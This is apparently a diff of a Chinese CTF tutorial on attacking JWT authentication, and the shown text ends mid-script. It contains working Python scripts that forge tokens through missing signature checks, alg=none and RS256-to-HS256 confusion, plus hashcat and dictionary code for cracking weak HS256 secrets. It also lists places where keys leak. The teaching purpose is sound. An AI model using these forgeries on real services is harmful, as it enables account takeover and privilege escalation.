@@ -1,5 +1,4 @@
 ---
-
 title: JWT
 date: 2026-07-15
 categories: [web安全, 常见漏洞]
@@ -7,16 +6,23 @@ recommend: 97
 type: tech
 ---
 
+# JWT 安全
 
+> JWT（JSON Web Token）是 CTF Web 中最常见的令牌格式。攻击的核心不是解码 Payload（任何人都能解码），而是绕过签名验证——不验签名、弱密钥、算法混淆、Header 注入都是常见突破口。
 
+---
 
-# 1.JWT
+## 一、场景
 
-JWT是一种用JSON传输的令牌，常用于身份认证。它的问题不是内容能被解码，而是签名可能被绕过——不验签名、弱密钥、算法混淆都是常见攻击方式。
+### 1.1 典型场景
 
-JWT（JSON Web Token）是一种使用 JSON 表示身份信息和权限信息的令牌格式。
+JWT（JSON Web Token）是 CTF Web 题目中最常见的身份认证方式之一。典型的场景是：
 
-在 CTF Web 中，JWT 常用于保存：
+```
+登录成功 → 服务端返回 JWT → 客户端保存 JWT → 访问需鉴权的接口
+```
+
+JWT Payload 中保存着身份和权限：
 
 ```json
 {
@@ -26,539 +32,7 @@ JWT（JSON Web Token）是一种使用 JSON 表示身份信息和权限信息的
 }
 ```
 
-服务器把这些信息放进 JWT，交给客户端保存。客户端以后访问需要登录的接口时，再把 JWT 发送给服务器。
-
-JWT 的安全性不在于"别人看不到内容"，而在于服务器能否通过签名判断内容有没有被修改。JWT Payload 通常只是 Base64URL 编码，并没有加密，任何拿到令牌的人都可以解码查看。
-
-JWT 标准允许令牌被签名、使用 MAC 保护或者加密；CTF 中最常见的是使用 JWS 紧凑格式的三段式 JWT。
-
----
-
-## 1.1 JWT 基础
-
-### 1.1.1 JWT 的基本结构
-
-常见 JWT 由三部分组成，中间使用英文句点 `.` 分隔：
-
-```txt
-Header.Payload.Signature
-```
-
-例如：
-
-```txt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
-eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-```
-
-去掉换行后才是一个完整 JWT：
-
-```txt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-```
-
-三部分分别是：
-
-| 部分 | 作用 |
-| ---- | ---- |
-| Header | 记录令牌类型、签名算法、密钥编号等信息 |
-| Payload | 保存用户名、用户 ID、权限、过期时间等数据 |
-| Signature | 防止 Header 和 Payload 被修改 |
-
-如果令牌只有两个点，一般是三段式 JWS：
-
-```txt
-第一段.第二段.第三段
-```
-
-如果令牌有四个点，也就是五段，则可能是 JWE 加密令牌：
-
-```txt
-第一段.第二段.第三段.第四段.第五段
-```
-
-JWE 和普通三段式 JWT 的结构不同，不能直接按照普通 JWS 的签名攻击思路处理。
-
-### 1.1.2 Header
-
-Header 一般是一个 JSON 对象。
-
-例如：
-
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```
-
-其中：
-
-| 字段 | 作用 |
-| ---- | ---- |
-| `alg` | 指定签名或 MAC 算法 |
-| `typ` | 表示令牌类型，常见值为 `JWT` |
-| `kid` | 指定使用哪一个密钥 |
-| `jku` | 指向保存公钥集合的 JWKS 地址 |
-| `jwk` | 直接在 Header 中携带 JWK 公钥 |
-| `x5u` | 指向 X.509 证书或证书链的 URL |
-
-Header 经过 Base64URL 编码后，形成 JWT 的第一部分。
-
-例如：
-
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```
-
-编码后可能是：
-
-```txt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-```
-
-Header 是用户可以修改的内容，服务器不能直接相信 Header 中的 `alg`、`kid`、`jku` 或 `jwk`。
-
-### 1.1.3 Payload
-
-Payload 用来保存一组 Claim，也就是令牌携带的信息。
-
-例如：
-
-```json
-{
-  "sub": "1001",
-  "username": "guest",
-  "role": "user",
-  "is_admin": false,
-  "iat": 1760000000,
-  "exp": 1760003600
-}
-```
-
-常见标准 Claim：
-
-| Claim | 作用 |
-| ---- | ---- |
-| `iss` | Issuer，令牌签发者 |
-| `sub` | Subject，令牌代表的主体或用户 |
-| `aud` | Audience，令牌允许交给谁使用 |
-| `exp` | Expiration Time，过期时间 |
-| `nbf` | Not Before，在这个时间之前不能使用 |
-| `iat` | Issued At，令牌签发时间 |
-| `jti` | JWT ID，令牌的唯一编号 |
-
-这些 Claim 不是所有 JWT 都必须包含。具体需要哪些字段，由应用自己决定。
-
-CTF 中还经常出现自定义 Claim：
-
-```json
-{
-  "username": "guest",
-  "role": "user",
-  "admin": false,
-  "uid": 1002
-}
-```
-
-常见攻击目标是：
-
-```json
-"username": "guest"
-```
-
-改成：
-
-```json
-"username": "admin"
-```
-
-或者把：
-
-```json
-"role": "user"
-```
-
-改成：
-
-```json
-"role": "admin"
-```
-
-也可能把：
-
-```json
-"is_admin": false
-```
-
-改成：
-
-```json
-"is_admin": true
-```
-
-但是修改 Payload 后，原来的签名一般会失效。只有服务器没有验证签名，或者我们能重新生成合法签名时，修改才可能生效。
-
-### 1.1.4 Signature
-
-Signature 用来保护 Header 和 Payload。
-
-签名或 MAC 计算的数据是：
-
-```txt
-Base64URL(Header) + "." + Base64URL(Payload)
-```
-
-例如：
-
-```txt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ
-```
-
-如果使用 HS256，计算过程可以理解为：
-
-```txt
-HMAC-SHA256(
-    Base64URL(Header) + "." + Base64URL(Payload),
-    secret
-)
-```
-
-签名结果再经过 Base64URL 编码，成为第三部分。
-
-因此，只要 Header 或 Payload 中有一个字符发生变化，签名结果通常就会完全不同。
-
-服务器收到 JWT 后，一般会：
-
-1. 取出 Header 和 Payload。
-2. 根据服务器预先配置的算法和密钥重新计算签名。
-3. 将重新计算的签名和 JWT 第三部分比较。
-4. 签名一致后，再检查过期时间、签发者、接收者和权限。
-5. 所有检查通过后，才允许访问接口。
-
-安全实现不应该直接根据用户提供的 `alg` 决定信任哪一种算法，而应该在服务器配置中固定允许使用的算法集合。
-
-### 1.1.5 Base64URL 编码
-
-JWT 使用的是 Base64URL，不是普通 Base64。
-
-主要区别：
-
-| 普通 Base64 | Base64URL |
-| ---- | ---- |
-| `+` | `-` |
-| `/` | `_` |
-| 经常保留 `=` | JWT 中通常去掉结尾的 `=` |
-
-Base64URL 只是编码，不是加密。
-
-看到：
-
-```txt
-eyJ1c2VybmFtZSI6ImFkbWluIn0
-```
-
-并不代表里面的数据不可读取。
-
-手工解码脚本：
-
-```python
-import base64
-import json
-
-token = "【JWT】"
-
-parts = token.strip().split(".")
-
-if len(parts) != 3:
-    print("当前脚本只处理常见的三段式 JWT")
-    exit()
-
-header_b64, payload_b64, signature_b64 = parts
-
-def b64url_decode(data):
-    data += "=" * (-len(data) % 4)
-    return base64.urlsafe_b64decode(data)
-
-header = json.loads(b64url_decode(header_b64))
-payload = json.loads(b64url_decode(payload_b64))
-
-print("Header:")
-print(json.dumps(header, ensure_ascii=False, indent=2))
-
-print("Payload:")
-print(json.dumps(payload, ensure_ascii=False, indent=2))
-
-print("Signature:")
-print(signature_b64)
-```
-
-这个脚本只负责解码，不会验证签名。
-
-解码成功不代表 JWT 合法。
-
-### 1.1.6 常见签名算法
-
-JWT 中常见算法：
-
-| 算法 | 类型 | 签名使用 | 验证使用 |
-| ---- | ---- | -------- | -------- |
-| `HS256` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
-| `HS384` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
-| `HS512` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
-| `RS256` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
-| `RS384` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
-| `RS512` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
-| `PS256` | RSA-PSS | RSA 私钥 | RSA 公钥 |
-| `ES256` | ECDSA | EC 私钥 | EC 公钥 |
-| `EdDSA` | EdDSA | 私钥 | 公钥 |
-| `none` | 不使用签名 | 无 | 无 |
-
-对称算法和非对称算法最大的区别是：
-
-1. **HS 系列**
-
-   生成令牌和验证令牌使用同一个密钥。
-
-   ```txt
-   secret
-   ```
-
-   如果密钥泄露，攻击者就可以自己签发任意令牌。
-
-2. **RS、PS、ES、EdDSA 系列**
-
-   服务器使用私钥签名，使用公钥验证。
-
-   ```txt
-   私钥：必须保密
-   公钥：可以公开
-   ```
-
-   只拿到公钥，一般不能直接生成合法的非对称签名。
-
-但是如果服务器把对称算法和非对称算法混在一起处理，公开的公钥可能被错误地当成 HMAC 密钥，引发算法混淆。
-
-### 1.1.7 JWT 常见位置
-
-JWT 常见于请求头：
-
-```http
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-```
-
-也可能放在 Cookie 中：
-
-```http
-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-```
-
-还可能出现在：
-
-1. 登录接口的 JSON 响应。
-2. 浏览器 Local Storage。
-3. Session Storage。
-4. URL 参数。
-5. 前端 JavaScript 变量。
-6. WebSocket 握手请求。
-7. GraphQL 请求头。
-8. 刷新令牌接口的请求体。
-
-拿到 JWT 后，要先确认服务器真正读取的是哪个位置。
-
-例如同时存在：
-
-```http
-Authorization: Bearer 【JWT 1】
-Cookie: token=【JWT 2】
-```
-
-服务器可能只读取其中一个，也可能存在优先级问题。
-
-修改 JWT 后没有效果，不一定是攻击失败，也可能是改错了令牌位置。
-
----
-
-## 1.2 JWT 的基本分析方法
-
-拿到 JWT 后，可以按照下面的顺序分析。
-
-1. **判断是否为三段式 JWT**
-
-   ```txt
-   Header.Payload.Signature
-   ```
-
-2. **解码 Header**
-
-   重点查看：
-
-   ```json
-   {
-     "alg": "HS256",
-     "typ": "JWT",
-     "kid": "key-1"
-   }
-   ```
-
-3. **解码 Payload**
-
-   重点查找：
-
-   ```txt
-   username
-   role
-   admin
-   is_admin
-   uid
-   user_id
-   exp
-   iss
-   aud
-   ```
-
-4. **确认算法类型**
-
-   ```txt
-   HS256 → 优先检查弱密钥
-   RS256 → 查找公钥、JWKS 和算法混淆
-   none  → 检查是否真的允许无签名
-   ```
-
-5. **修改一个容易观察的字段**
-
-   例如：
-
-   ```json
-   "role": "user"
-   ```
-
-   改成：
-
-   ```json
-   "role": "admin"
-   ```
-
-6. **保留原签名发送**
-
-   如果服务器仍然接受，说明可能根本没有验证签名。
-
-7. **测试空签名或 `alg=none`**
-
-8. **HS 系列尝试寻找或爆破密钥**
-
-9. **RS 系列检查算法混淆、`jku`、`jwk` 和 `kid`**
-
-10. **检查过期时间、受众、签发者和令牌重放**
-
----
-
-## 1.3 服务器未验证签名
-
-最简单的 JWT 漏洞是服务器只解码 Payload，却没有验证 Signature。
-
-例如后端可能写成类似：
-
-```python
-payload = jwt.decode(
-    token,
-    options={"verify_signature": False}
-)
-
-if payload["role"] == "admin":
-    return flag
-```
-
-这段代码会读取 Payload，但关闭了签名验证。
-
-攻击时可以把：
-
-```json
-{
-  "username": "guest",
-  "role": "user"
-}
-```
-
-改成：
-
-```json
-{
-  "username": "admin",
-  "role": "admin"
-}
-```
-
-然后保留原来的 Signature，或者换成任意内容。
-
-手工生成一个修改后的 JWT：
-
-```python
-import base64
-import json
-
-original_token = "【原 JWT】"
-
-header_b64, payload_b64, signature_b64 = original_token.split(".")
-
-def b64url_encode(data):
-    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
-
-header = json.loads(
-    base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4))
-)
-
-payload = json.loads(
-    base64.urlsafe_b64decode(payload_b64 + "=" * (-len(payload_b64) % 4))
-)
-
-payload["username"] = "admin"
-payload["role"] = "admin"
-
-new_header = b64url_encode(
-    json.dumps(header, separators=(",", ":")).encode()
-)
-
-new_payload = b64url_encode(
-    json.dumps(payload, separators=(",", ":")).encode()
-)
-
-new_token = f"{new_header}.{new_payload}.{signature_b64}"
-
-print(new_token)
-```
-
-如果服务器正确验证签名，这种修改会让签名失效。
-
-因此，修改 Payload 后成功并不代表签名被破解了，更可能是服务器没有执行签名验证。
-
----
-
-## 1.4 `alg=none` 无签名绕过
-
-JWT 的 `none` 算法表示令牌不使用签名。
-
-攻击思路是：
-
-1. 把 Header 中的算法改成 `none`。
-2. 修改 Payload 中的身份或权限。
-3. 删除 Signature。
-4. 保留第二个点，让 JWT 仍然有三部分。
-
-Header：
-
-```json
-{
-  "alg": "none",
-  "typ": "JWT"
-}
-```
-
-Payload：
+攻击者能解码看到内容（只是 Base64URL 编码，没有加密），目标是**修改身份并绕过签名验证**：
 
 ```json
 {
@@ -568,626 +42,572 @@ Payload：
 }
 ```
 
-最终结构：
+### 1.2 JWT 在实战中的位置
 
-```txt
-Base64URL(Header).Base64URL(Payload).
-```
+| 请求位置 | 示例 | 攻击注意事项 |
+|---------|------|------------|
+| Authorization Header | `Authorization: Bearer eyJ...` | 最常见的携带位置 |
+| Cookie | `Cookie: token=eyJ...` | 可能同时存在于其他位置 |
+| URL 参数 | `?token=eyJ...` | 容易在日志中泄露 |
+| POST Body | `{"token":"eyJ..."}` | 用于刷新令牌接口 |
+| WebSocket | 握手头中携带 | 可能不受 CSRF 保护 |
 
-注意最后仍然有一个点：
+### 1.3 JWT vs Session Token 对比
 
-```txt
-xxxxx.yyyyy.
-```
+| 属性 | JWT | Session Token |
+|:----:|:---:|:-------------:|
+| 存储位置 | 客户端 | 服务端内存/数据库 |
+| 状态性 | 无状态（服务端不存 session） | 有状态（需要查询） |
+| 可扩展性 | 跨服务验证（同一密钥） | 需共享 session 存储 |
+| 吊销 | 困难（需黑名单或等过期） | 直接删 session |
+| 大小 | 较大（含 Payload 和签名） | 小（只有随机 ID） |
+| CTF 常见 | 最常见 | 传统模式 |
 
-生成脚本：
+### 1.4 JWT 安全问题 7 个层面
 
-```python
-import base64
-import json
+JWT 安全问题可以分为**7 个层面**，后面按此模型逐一讲解：
 
-header = {
-    "alg": "none",
-    "typ": "JWT"
-}
-
-payload = {
-    "username": "admin",
-    "role": "admin",
-    "is_admin": True
-}
-
-def encode_json(data):
-    raw = json.dumps(
-        data,
-        separators=(",", ":"),
-        ensure_ascii=False
-    ).encode()
-
-    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
-
-token = f"{encode_json(header)}.{encode_json(payload)}."
-
-print(token)
-```
-
-有些老旧或错误实现可能还会错误处理不同大小写：
-
-```json
-{"alg":"None"}
-{"alg":"NONE"}
-{"alg":"nOnE"}
-```
-
-但是这些写法不是通用规则。
-
-现代 JWT 库在正确配置时通常会拒绝 `none`。服务器应该明确限制允许的算法，不能只相信令牌自己声明的 `alg`。
-
-常见注意点：
-
-1. `alg=none` 不是所有 JWT 都能绕过。
-2. Header 中的算法通常写成小写 `none`。
-3. 最后一般要保留一个点。
-4. 如果服务器固定只允许 `HS256` 或 `RS256`，就会拒绝。
-5. 只删除 Signature 但不修改 `alg`，和 `alg=none` 不是一回事。
-6. 如果令牌过期检查仍然存在，还要考虑 `exp`。
+| 层面 | 问题 | 攻击类型 |
+|:----:|------|---------|
+| 1 | 签名验证 | 服务端是否真的验证了签名 |
+| 2 | 算法控制 | 攻击者能否篡改 `alg` |
+| 3 | 密钥安全 | 密钥是否可爆破或泄露 |
+| 4 | Header 注入 | `kid`/`jku`/`jwk`/`x5u` 是否可被控制 |
+| 5 | Claim 校验 | `exp`/`nbf`/`iss`/`aud` 是否验证 |
+| 6 | 令牌类型混淆 | Access/Refresh/ID Token 是否混用 |
+| 7 | 重放攻击 | 同一令牌能否重复使用 |
 
 ---
 
-## 1.5 HS 系列弱密钥
+## 二、原理
 
-HS256 使用同一个密钥生成和验证 MAC。
+### 2.1 JWT 三段结构
 
-例如：
+JWT（JWS 紧凑格式）由三个 Base64URL 编码的部分以 `.` 分隔：
 
-```txt
-secret
+```
+Header.Payload.Signature
 ```
 
-如果密钥很弱：
+| 部分 | 作用 | 举例 |
+|:----:|------|------|
+| Header | 算法、令牌类型、密钥标识 | `{"alg":"HS256","typ":"JWT"}` |
+| Payload | 身份、权限、过期时间等 | `{"username":"guest","role":"user"}` |
+| Signature | 防止篡改 | HMAC 或 RSA 签名结果 |
 
-```txt
-123456
-secret
-jwtsecret
-admin
-password
-ctf
-```
-
-攻击者拿到一个 JWT 后，可以在本地不断尝试候选密钥。
-
-这个过程不需要向服务器发送大量请求，因为每次尝试都可以在本地计算签名，再和 JWT 中的 Signature 比较。
-
-常见密钥来源：
-
-1. 源码中的硬编码字符串。
-2. `.env` 文件。
-3. Docker 环境变量。
-4. 配置文件。
-5. Git 泄露。
-6. 备份文件。
-7. 默认配置。
-8. 题目名称。
-9. 用户名或站点域名。
-10. 常见字典。
-
-例如源码中出现：
+**解码方式**（Base64URL 不是加密，任何人都能解码）：
 
 ```python
-JWT_SECRET = "secret123"
+import base64, json
+
+token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.xxx"
+h_b64, p_b64, s_b64 = token.split(".")
+
+def b64u_decode(s):
+    s += "=" * (-len(s) % 4)
+    return json.loads(base64.urlsafe_b64decode(s))
+
+print("Header:", b64u_decode(h_b64))
+print("Payload:", b64u_decode(p_b64))
 ```
 
-就可以直接使用这个密钥伪造令牌。
+### 2.2 JWT 四种格式
 
-使用 Hashcat 爆破：
+| 格式 | 段数 | 用途 | 说明 |
+|:----:|:----:|:----:|------|
+| JWS 紧凑格式 | 3 段 | 签名令牌 | `Header.Payload.Signature`，最常见 |
+| JWE 紧凑格式 | 5 段 | 加密令牌 | 额外包含加密密钥和 IV |
+| JWS JSON 序列化 | JSON | 签名令牌（多签名） | 可以包含多个签名 |
+| JWE JSON 序列化 | JSON | 加密令牌 | JSON 格式的加密 JWT |
+
+CTF 中 95% 以上使用**JWS 紧凑格式**（3 段式）。
+
+### 2.3 Base64URL vs Base64
+
+| 差异 | Base64 | Base64URL |
+|:----:|:------:|:---------:|
+| 第 62 字符 | `+` | `-` |
+| 第 63 字符 | `/` | `_` |
+| 填充符 | `=` (通常保留) | 通常去掉 `=` |
+| 用途 | 通用编码 | URL 安全的编码 |
+| JWT 中使用 | 否 | 是 |
+
+### 2.4 签名算法分类
+
+| 类型 | 算法 | 签名字钥 | 验签钥匙 | CTF 常见攻击 |
+|:----:|:----:|:--------:|:--------:|-------------|
+|**对称**| HS256/HS384/HS512 | 同一密钥 | 同一密钥 | 弱密钥爆破 |
+|**非对称**| RS256/RS384/RS512 | 私钥(保密) | 公钥(公开) | 算法混淆、jku/jwk 注入 |
+|**非对称 (PSS)**| PS256/PS384/PS512 | 私钥(保密) | 公钥(公开) | 同 RS，签名格式不同 |
+|**非对称 (ECDSA)**| ES256/ES384/ES512 | EC 私钥 | EC 公钥 | 可能密钥泄露 |
+|**非对称 (EdDSA)**| EdDSA | 私钥 | 公钥 | 较新，CTF 少见 |
+|**无**| none | 无 | 无 | `alg=none` 绕过 |
+
+**对称 vs 非对称的密钥管理**：
+
+| 特性 | 对称 (HS) | 非对称 (RS/PS/ES) |
+|:----:|:---------:|:-----------------:|
+| 密钥数量 | 1 个（共享） | 2 个（私钥+公钥） |
+| 密钥分发 | 挑战性大 | 私钥保密，公钥公开 |
+| 验证端 | 需要知道密钥 | 只需要公钥 |
+| 性能 | 快速 | 较慢（尤其是签名） |
+| CTF 弱密钥爆破 |  常见 |  不常见（私钥不公开） |
+
+---
+
+## 三、实战：6 步攻击思维模型
+
+拿到 JWT 后，按照以下流程系统地分析：
+
+```
+拿到 JWT
+  │
+  ├── 步骤 ①：签名验证是否存在？
+  │     ├─ 直接修改 Payload，保留原签名 → 成功 = 无验证
+  │     └─ 失败 → 进入步骤 ②
+  │
+  ├── 步骤 ②：算法能否被篡改？
+  │     ├─ 改成 "alg": "none" → 成功 = none 绕过
+  │     ├─ 对称改非对称混淆 → 成功 = 算法混淆
+  │     └─ 失败 → 进入步骤 ③
+  │
+  ├── 步骤 ③：密钥是否可获取或爆破？
+  │     ├─ HS 系列 → 字典爆破密钥
+  │     ├─ 源码泄露 / Git 泄露 → 直接获取密钥
+  │     └─ 失败 → 进入步骤 ④
+  │
+  ├── 步骤 ④：Header 注入点？
+  │     ├─ kid → 路径穿越 / SQL 注入
+  │     ├─ jku → 自建 JWKS 服务器
+  │     ├─ jwk → 直接嵌入公钥
+  │     ├─ x5u → 证书 URL 注入
+  │     └─ 失败 → 进入步骤 ⑤
+  │
+  ├── 步骤 ⑤：Claim 校验是否完整？
+  │     ├─ exp 不检查 → 永不过期
+  │     ├─ nbf 不检查 → 使用未来令牌
+  │     ├─ iss/aud 不检查 → 跨系统冒用
+  │     └─ 失败 → 进入步骤 ⑥
+  │
+  ├── 步骤 ⑥：令牌类型混淆？
+  │     ├─ Access Token 当 Refresh Token 用
+  │     ├─ ID Token 当 Access Token 用
+  │     └─ 失败 → 进入步骤 ⑦
+  │
+  └── 步骤 ⑦：能否重放？
+        ├─ 已有合法令牌 → 直接复用
+        └─ 令牌泄露 → 窃取后重放
+```
+
+---
+
+### 步骤 ①：签名验证是否存在
+
+#### 【场景】服务端只解码 Payload，不验证签名。
+
+```python
+# 危险写法：关闭了签名验证
+payload = jwt.decode(
+    token,
+    options={"verify_signature": False}
+)
+```
+
+#### 【实战】直接修改 Payload，保留原签名。
+
+```python
+import base64, json
+
+tok = "原JWT字符串"
+h_b64, p_b64, s_b64 = tok.split(".")
+
+# 解码并修改 Payload
+def b64u_decode(s):
+    s += "=" * (-len(s) % 4)
+    return json.loads(base64.urlsafe_b64decode(s))
+
+payload = json.loads(b64u_decode(p_b64))
+payload["role"] = "admin"
+
+# 重新编码
+def b64u_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+new_payload = b64u_encode(
+    json.dumps(payload, separators=(",", ":")).encode()
+)
+
+new_token = f"{h_b64}.{new_payload}.{s_b64}"
+print(new_token)
+```
+
+#### 【判断有无签名验证的测试流程】
+
+| 测试 | 操作 | 预期结果（未验证） | 预期结果（已验证） |
+|:----:|:----:|:-----------------:|:-----------------:|
+| 1 | 修改 payload 中的 username | 访问接口返回新身份 | 返回 401/403 |
+| 2 | 修改 payload 的 role 为 admin | 获取到管理员功能 | 返回 401/403 |
+| 3 | 随便改签名最后几个字符 | 请求仍然通过 | 返回 401/403 |
+| 4 | 删除签名部分，只剩 Header.Payload. | 请求仍然通过 | 解析失败 |
+
+ **新手避坑**：修改后成功不代表破解了签名，很可能只是服务器压根没验证。
+
+ **新手避坑**：如果改了 Payload 后服务端没有任何反应，除了检查签名验证外，还要确认是否改对了令牌位置（Header vs Cookie vs URL 参数）。
+
+ **新手避坑**：有些题目会同时验证多个位置的 JWT，例如 Authorization 头里的和 Cookie 里的。修改其中一个可能还不够，需要同时修改所有位置。
+
+---
+
+### 步骤 ②：算法能否被篡改
+
+#### 2.1 `alg=none` 无签名绕过
+
+#### 【场景】服务端接受 `alg: none`，跳过签名验证。
+
+```json
+{"alg": "none", "typ": "JWT"}
+```
+
+#### 【原理】JWT 标准中 `none` 算法表示不使用签名。如果服务端库直接信任 Header 中的算法声明，攻击者可绕过验证。
+
+#### 【实战】生成无签名 JWT：
+
+```python
+import base64, json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"username": "admin", "role": "admin"}
+
+def enc(data):
+    return base64.urlsafe_b64encode(
+        json.dumps(data, separators=(",", ":")).encode()
+    ).rstrip(b"=").decode()
+
+# 注意：最后仍然有一个点
+token = f"{enc(header)}.{enc(payload)}."
+print(token)
+```
+
+**大小写变体**（不一定通用）：`None`、`NONE`、`nOnE`、`NoNe`
+
+#### 【各库对 none 的处理方式】
+
+| 库 | 默认拒绝 none？ | 配置方式 |
+|:---:|:--------------:|---------|
+| PyJWT 2.x |  | 必须显式允许 |
+| firebase/php-jwt |  | - |
+| node-jsonwebtoken |  | - |
+| golang-jwt |  | 默认白名单 |
+| jjwt (Java) |  | - |
+
+ **新手避坑**：
+- `none` 绕过后，JWT 结尾**必须保留一个 `.`**
+- 现代 JWT 库通常拒绝 `none`，需要明确配置 `{"alg": ["HS256"]}` 来防御
+- 只删除 Signature 而不改 `alg` 是另一回事
+- 不同库对 `None`、`NONE` 等大小写变体的处理不同
+
+ **新手避坑**：不同库对大小写变体的处理不同。有些库将 `None`、`NONE`、`nOnE` 视为不同的算法名，有些则统一处理为 `none`。测试时应当逐一尝试所有形式。
+
+ **新手避坑**：如果服务器同时使用多个 JWT 库（如一个用于签名，另一个用于验证），它们对标准/非标准行为的处理差异可能产生额外的绕过空间。
+
+#### 2.2 RS256 → HS256 算法混淆
+
+#### 【场景】服务端混用对称和非对称算法，且**公钥公开**。
+
+```
+原：alg=RS256, 验签用 RSA 公钥
+改：alg=HS256, 把 RSA 公钥内容当 HMAC 密钥
+```
+
+#### 【原理】当服务端验证签名时，根据 JWT Header 中的 `alg` 选择验证算法。如果攻击者将 `RS256` 改为 `HS256`，而服务端错误地将 RSA 公钥（公开的）当作 HMAC 密钥传递给验证函数，攻击者就可以用公钥内容生成合法的 HS256 签名。
+
+#### 【实战】获取公钥后以 HS256 伪造令牌。
+
+```python
+import base64, hashlib, hmac, json
+
+# 读取公开的 RSA 公钥
+with open("public.pem", "rb") as f:
+    public_key = f.read()
+
+header = {"alg": "HS256", "typ": "JWT"}
+payload = {"username": "admin", "role": "admin", "is_admin": True}
+
+def b64u_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
+p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
+
+signing = f"{h_b64}.{p_b64}".encode()
+signature = hmac.new(public_key, signing, hashlib.sha256).digest()
+sig_b64 = b64u_encode(signature)
+
+token = f"{h_b64}.{p_b64}.{sig_b64}"
+print(token)
+```
+
+**获取公钥的常见位置**：
+
+| 路径 | 说明 |
+|------|------|
+| `/public.pem` | 根目录直接访问 |
+| `/static/public.pem` | 静态资源目录 |
+| `/.well-known/jwks.json` | 标准 JWKS 端点 |
+| `/jwks.json` | 自定义端点 |
+| 源码/Git 泄露 | 配置文件或注释 |
+| 错误信息 | 某些错误会泄露公钥内容 |
+| `/.env` | 环境变量文件 |
+| API 文档 | 开发文档中可能包含测试密钥 |
+
+#### 【算法混淆成功 checklist】
+
+- [ ] 原 JWT 使用非对称算法（RS256/RS384/RS512）
+- [ ] 能获取到服务端验证时使用的公钥
+- [ ] 服务端没有固定算法白名单
+- [ ] 服务端把对称和非对称算法混合处理
+- [ ] 公钥内容完整（含 `-----BEGIN PUBLIC KEY-----`）
+
+ **新手避坑**：
+- 公钥公开本身不是漏洞，漏洞在**把公钥当 HMAC 密钥用**
+- 新版 PyJWT 会阻止 PEM 用于 HS256，但目标服务器可能仍存在漏洞
+- 验证时注意公钥文件的完整内容（包括 `-----BEGIN PUBLIC KEY-----`）
+
+---
+
+### 步骤 ③：密钥是否可获取或爆破
+
+#### 【场景】HS 系列对称算法，密钥较弱或可获取。
+
+```
+token = jwt.encode(payload, "secret123", algorithm="HS256")
+```
+
+#### 【原理】HS256 使用同一个密钥签名和验证。如果密钥是弱口令，攻击者可以在本地计算 HMAC 并比对，无需向服务器发送大量请求。
+
+#### 【实战一：字典爆破 HS 密钥】
 
 ```bash
+# 将完整 JWT 保存到 token.txt
 hashcat -m 16500 token.txt rockyou.txt
-```
 
-其中 `token.txt` 保存完整 JWT：
-
-```txt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.xxxxx
-```
-
-查看已经破解的结果：
-
-```bash
+# 查看结果
 hashcat -m 16500 token.txt --show
 ```
 
-这种方法主要针对：
+**常见弱密钥来源**：
 
-```txt
-HS256
-HS384
-HS512
-```
+| 来源 | 示例 |
+|------|------|
+| 常见密码 | `123456`, `secret`, `password`, `admin` |
+| JWT 相关 | `jwtsecret`, `jwttoken`, `hs256` |
+| CTF 常见 | `ctf`, `flag`, `key`, `test` |
+| 源码硬编码 | `$secret = "hardcoded-key";` |
+| Docker 环境变量 | `JWT_SECRET=default_value` |
+| .env 文件 | 配置文件中的默认值 |
+| 题目名称/域名 | `chzu-ctf-2026` |
+| 用户/应用名 | `admin`, `root`, `app` |
 
-不能直接用来爆破正常 RS256 JWT 的 RSA 私钥。
-
-拿到密钥后，可以使用 PyJWT 生成管理员令牌：
+#### 【实战二：使用 Python 手工爆破 HS256】
 
 ```python
-import jwt
-import time
+import base64, hashlib, hmac, json
 
-secret = "【爆破出来的密钥】"
+jwt_token = "eyJh...原JWT"
+h_b64, p_b64, sig_b64 = jwt_token.split(".")
+signing_input = f"{h_b64}.{p_b64}".encode()
+target_sig = base64.urlsafe_b64decode(sig_b64 + "===")
+
+def b64u_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+# 尝试字典中的每个密钥
+with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
+    for line in f:
+        secret = line.rstrip("\r\n").encode()
+        computed = hmac.new(secret, signing_input, hashlib.sha256).digest()
+        if computed == target_sig:
+            print(f"[+] 密钥找到: {secret.decode()}")
+            break
+```
+
+#### 【实战三：用密钥伪造 HS256 令牌】
+
+```python
+import jwt, time
+
+secret = "爆破出的密钥"
 
 payload = {
     "username": "admin",
     "role": "admin",
     "is_admin": True,
     "iat": int(time.time()),
-    "exp": int(time.time()) + 3600
+    "exp": int(time.time()) + 3600,
 }
 
